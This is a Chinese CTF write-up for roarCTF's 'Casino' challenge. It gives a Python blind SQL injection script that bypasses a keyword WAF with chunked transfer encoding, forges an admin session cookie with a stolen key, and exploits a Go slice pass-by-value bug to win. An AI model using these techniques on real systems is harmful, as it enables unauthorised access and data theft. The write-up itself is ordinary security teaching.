## roarCTF dist

其实这道题叫Casino，当时出完题打包的文件夹叫dist。结果运维师傅把它当成题目名了

impakho师傅放题后很快就到最后一步了，师傅tql

## 考点

+ Webpack打包后.map资源文件泄露前端源码
+ HTTP transfer-encoding传输机制绕WAF
+ Golang Gin框架Client-Session伪造
+ Golang变量值传递 + 引用类型Slice带来的漏洞

***

1. 首先发现网站是前后端分离架构，前端VUE使用Webpack打包。用Chrome打开，发现`build.js.map`文件，还原出前端源码，在`config.js`中找到备份文件路径`backup-for-debug.7z`

   ![](https://github.com/EddieIvan01/roarCTF-dist-casino/blob/master/img/1.png)

2. 拿到源码，进行审计。发现是一个赌场游戏的系统，获知以下信息：

   + 每一个用户可以获取六次0-99的金额
   + 最终获得flag的条件是用户总金额加上一个大随机数`uint64(0xFFFFFFF+rand.Intn(0xFFFFF))`等于`0x1010010C`或总金额大于`999999`
   + 整个赌场的系统只有管理员有权限添加游戏用户，开启赌场游戏和重置赌场游戏
   + 赌场游戏一轮持续五分钟

3. 发现登录注册处存在SQLite3注入，但网站前端套了一层Tcp过滤关键字的WAF，使用HTTP的分块传输机制绕过关键字过滤

   ![](https://github.com/EddieIvan01/roarCTF-dist-casino/blob/master/img/2.png)

   WAF过滤，在Tcp层面过滤了关键字，可使用`Transfer-Encoding: chunked`机制绕过(或者Tcp分包应该也是可以的，因为WAF的实现是块转发)

   ![](https://github.com/EddieIvan01/roarCTF-dist-casino/blob/master/img/3.png)

   编写盲注脚本，可以使用BurpSuite插件进行Chunked编码

   这里不用代理直接用requests实现chunked

   注入脚本：

   ```python
   import requests
   
   url = 'http://IP:50000/auth/login'
   
   flag = ''
   for i in range(1, 32):
       for j in 'zxcvbnmlkjhgfdsaqwertyuiop0987654321!@#$%^&*()_+':
           t = f"iv4n' and substr((select secret from secret limit 1),{i},1)='{j}'-- -"
           tmp = f'{{"uname":"{t}","pwd":"11111111"}}'
   
           def data():
               for w in tmp:
                   yield w.encode()
   
           r = requests.post(url, data=data(), headers={'Content-Type': 'application/json'})
           if r.json()['msg'] == 'ok':
               flag += j
               break
       print(flag)
   
   ```

4. 注入成功后可拿到管理员密码，但发现数据库存储加盐了，salt写在配置文件无从得知，所以很难还原出管理员密码，需要换一个思路

5. 发现Session的密钥存在数据库的secret表里，且观察发现Session数据是存储在Cookie中的。

   ![](https://github.com/EddieIvan01/roarCTF-dist-casino/blob/master/img/4.png)

   注入获取密钥

   ![](https://github.com/EddieIvan01/roarCTF-dist-casino/blob/master/img/5.png)

   利用工具：`https://github.com/EddieIvan01/secure-cookie-faker`还原Session数据，并使用密钥对数据进行伪造

   ![](https://github.com/EddieIvan01/roarCTF-dist-casino/blob/master/img/6.png)

   成功以管理员身份登录，但是由于不知道管理员密码而无法通过个人详情页的密码二次校验（这里是为了防止选手伪造身份查看其他选手的flag）

6. 再次审计服务代码，发现问题（其实后面的利用就是confidenceCTF原题思路，换了流程而已）：

   服务端在添加游戏用户时使用了值传递

   ```go
   // applies to join
   func (s *Service) ApplicatUser(u U) {
   	s.m.Lock()
   	defer s.m.Unlock()
   	for name, _ := range s.Pendings {
   		if name == u.Uname {
   			return
   		}
   	}
   	for name, _ := range s.Players {
   		if name == u.Uname {
   			return
   		}
   	}
   
   	s.Pendings[u.Uname] = u
   }
   
   // add user from []pendings to []players
   func (s *Service) AddPlayer(u U) error {
   	s.m.Lock()
   	defer s.m.Unlock()
   
   	if len(s.Players) >= MAX_USER {
   		return errors.New("players are enough")
   	}
   
   	if _, ok := s.Players[u.Uname]; ok {
   		return errors.New("you are already a player")
   	}
   
   	if _, ok := s.Pendings[u.Uname]; !ok {
   		return errors.New("not in pending list")
   	}
   	delete(s.Pendings, u.Uname)
   	s.Players[u.Uname] = u
   
   	return nil
   }
   ```

   最后计算金额总和是否等于`0x1010010C`时是在值传递的User结构体成员的Slice上操作

   ```go
   func (s *Service) Calc() {
   	time.Sleep(s.Duration)
   
   	s.m.Lock()
   	defer s.m.Unlock()
   
   	var total []uint64
   	for _, player := range s.Players {
   		// the way to win
   		// e.g.
   		// suppose your balances is [99, 99, 99, 99, 99, 99]
   		// if 99*6 + $RANDOM == 0x1010010C then you win!
   		// GOOD LUCK
   		total = player.balances
   		total = append(total, uint64(0xFFFFFFF+rand.Intn(0xFFFFF)))
   		if sum(total) == 0x1010010C {
   			s.Winners[player.Uname] = struct{}{}
   		}
   	}
   	s.Doing = false
   }
   ```

   结合两者这里产生一处内存覆盖的漏洞，要理解这个漏洞，需要先了解Golang的Slice类型

   Golang中有引用类型和值类型之分，所谓引用类型，即底层的结构体中包含了原始数据的指针，所以在引用类型传递时即使传递引用类型的值也可以修改原始数据。其中Slice的底层类型是

   ```go
   struct GoSlice {
       // 指向底层原始数组的指针
       ptr *Elem
       
       // 切片的长度，即已有的数据量
       len int
       
       // 切片的容量，即最大能容纳的数据量，超过这个值会重新分配底层数组
       cap int
   }
   ```

   要理解引用类型的行为，可以看一下这两个函数

   ```go
   func addOne(s []int) {
       s[0] = 1
   }
   
   func appendOne(s []int) {
       s = append(s, 1)
   }
   
   func main() {
       s1 := []int{0, 0}
       s2 := []int{0, 0}
       addOne(s1)
       appendOne(s2)
       fmt.Println(s1)
       fmt.Println(s2)
   }
   
   /*
   output:
   [1 0]
   [0 0]
   */
   ```

   为什么修改第一个元素的值成功而添加一个元素的值失败呢？

   因为第一个函数中修改第一个元素的值是通过底层数组指针偏移寻址，修改了底层int变量的值，所以在函数外可见

   而在第二个函数中`append`操作确实成功了，底层数组也确实被修改为了`[0 0 1]`，但是由于引用类型本身还是值传递，所以appendOne函数内获得的是main函数中切片的拷贝，当调用append函数时由于`len == cap`，所以重新分配了底层数组元素并将`[0 0]`拷贝过去，接着修改slice底层结构体的长度`len++`，容量为4，但此时原始的s切片长度依然为2，所以它可见的切片依然是`[0 0]`（即使容量足够没有分配新的底层数组也是如此）

   ***

   此时回到题目中来，题目的逻辑是这样的：

   1. 管理员将用户加入正式游戏成员，`struct Service`的Players切片中加入`struct U`（即U的拷贝）
   2. 赌场游戏结算，将`struct Service`的Players切片的所有`struct U`的金额都加上一个大随机数，注意这里在slice上append，仅仅是对函数内的一个切片拷贝做操作，当函数执行完成栈帧弹出该拷贝也就被释放了

   那么假如我们能让结算时加上的大随机数能够在函数外被访问，那么我们就达到了总金额大于99999的条件从而能获取flag

   利用思路如下：

   1. 用户连续三次`beg`，此时Balance切片为`[99, 99, 99]`，长度为3，容量为4
   2. 请求加入游戏，使用admin的session添加用户到正式成员，服务端会将User的拷贝加入Players切片
   3. 使用admin账号开始赌场服务
   4. 再次`beg`，此时用户能访问到User结构体的Balance为`[99, 99, 99, 99]`，长度为4，容量为4。而服务Players切片中的当前用户Balance依然为`[99, 99, 99]`
   5. 等待五分钟游戏结算，服务为Balance拷贝加入一个大随机数，由于拷贝看到的结构体长度为3，所以它向原始数组偏移量为4的位置加入大随机数，即可成功覆盖内存加入大随机数。此时用户总金额大于99999
   6. 访问User info界面，即可获取flag

   利用脚本：

   ```python
   import requests
   import time
   
   url = 'http://IP'
   u = 'iv4n'
   pwd = '11111111'
   duration = 5 * 60
   
   admin_cookie = 'MTU2NjA1MDgzMHxFXy1CQkFFQkEwOWlhZ0hfZ2dBQkVBRVFBQUFfXzRJQUFnWnpkSEpwYm1jTUJ3QUZkVzVoYldVR2MzUnlhVzVuREFjQUJXRmtiV2x1Qm5OMGNtbHVad3dKQUFkcGMwRmtiV2x1QkdKdmIyd0NBZ0FCfOM2FZ8ee4WAWKbJaHcjTwpQCiLvR-QBsqNeM7GrH4a7 '
   
   s = requests.Session()
   s.post(url + ':50000/auth/login', json={'uname': u, 'pwd': pwd})
   s.post(url + ':50001/api/u/reset', json={'pwd': pwd})
   s.post(url + ':50001/api/u/beg', json={'pwd': pwd})
   s.post(url + ':50001/api/u/beg', json={'pwd': pwd})
   s.post(url + ':50001/api/u/beg', json={'pwd': pwd})
   
   requests.get(
       url + ':50001/api/service/manage/reset',
       cookies={
           'casino': admin_cookie,
       })
   requests.get(
       url + ':50001/api/service/manage/start',
       cookies={
           'casino': admin_cookie
       })
   
   s.post(url + ':50001/api/u/join', json={'pwd': pwd})
   r = s.get(url + ':50001/api/service/player-status')
   print(r.text)
   
   requests.post(
       url + ':50001/api/service/manage/add-player',
       json={'uname': u},
       cookies={
           'casino': admin_cookie,
       })
   
   r = s.get(url + ':50001/api/service/player-status')
   print(r.text)
   s.post(url + ':50001/api/u/beg', json={'pwd': pwd})
   time.sleep(duration)
   r = s.post(url + ':50001/api/u/info', json={'pwd': pwd})
   print(r.text)
   ```

   ![](https://github.com/EddieIvan01/roarCTF-dist-casino/blob/master/img/7.png)

   这里由于是测试环境没有设置flag环境变量，题目环境可由脚本直接获取flag
